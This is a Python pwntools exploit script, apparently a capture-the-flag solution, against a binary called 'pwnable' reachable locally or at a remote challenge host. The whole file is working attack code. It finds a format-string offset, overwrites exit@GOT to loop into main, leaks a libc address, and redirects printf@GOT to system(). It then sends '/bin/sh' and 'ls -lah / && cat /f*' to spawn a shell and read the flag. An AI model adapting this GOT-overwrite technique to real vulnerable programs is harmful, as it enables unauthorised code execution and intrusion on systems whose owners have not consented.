from pwn import *
import sys

context.binary = "./pwnable"

binary = ELF("./pwnable", checksec = False)

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        p = process("./pwnable")
        # p = remote("stack.overflow.fail", 9002)
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "B" * 2
        payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("Give me a string to echo back.\n")
        stack_value = p.recvline()[6:-1]
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit(target, system_diff):
    exit_got = binary.symbols["got.exit"]
    log.info("Exit@got: {}".format(hex(exit_got)))
    main_addr = 0x0804851b
    log.info("Main addr: {}".format(hex(main_addr)))

    # Let's create infinite loop by overwriting exit@got address into main address
    payload = ""
    payload += "A" * 2 
    payload += p32(exit_got)
    payload += p32(exit_got + 2)
    payload += "%11${}p".format(0x851b - len(payload))
    payload += "%11$hn"
    payload += "%12${}p".format(0x10804 - 0x851b)
    payload += "%12$hn"
    
    p.sendline(payload)    
    p.recvuntil("Give me a string to echo back.\n")
    
    payload = ""
    payload += "%59$p"   
    p.sendline(payload)
    p.recvuntil("Give me a string to echo back.\n")
    
    libc_leak = p.recvline()[2:-1]
    libc_leak = int(libc_leak, 16)
    log.info("Libc leak: {}".format(hex(libc_leak)))
    system_libc = libc_leak + system_diff    
    log.info("Libc system: {}".format(hex(system_libc)))

    printf_got = binary.symbols["got.printf"]
    log.info("Printf@got: {}".format(hex(printf_got)))
    overwrite = str(hex(system_libc))[2:]
    first_overwrite = int(overwrite[4:], 16)
    log.info("First overwrite: {} or in hex {}".format(first_overwrite, hex(first_overwrite)))
    second_overwrite = int(overwrite[:4], 16)
    log.info("Second overwrite: {} or in hex {}".format(second_overwrite, hex(second_overwrite)))

    payload = ""
    payload += "A" * 2
    payload += p32(printf_got)
    payload += p32(printf_got + 2)
    payload += "%11${}p".format(first_overwrite - len(payload))
    payload += "%11$hn"
    payload += "%12${}p".format(second_overwrite - first_overwrite)
    payload += "%12$hn"

    # gdb.attach(p, """
    #               b*main
    #               b*main+105    
    #               b*main+120
    #               c
    #               """)

    p.sendline(payload)    
    sleep(1)
    p.sendline("/bin/sh\x00")
    p.sendline("ls -lah / && cat /f*")

    p.interactive()
    
if __name__ == "__main__":
    offset_finder()
    '''
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./pwnable")
        exploit(p, 0x2437f)
    elif sys.argv[1] == "remote":
        p = remote("stack.overflow.fail", 9002)
        exploit(p, 0x22309)
    else:
        sys.exit(0)
    '''
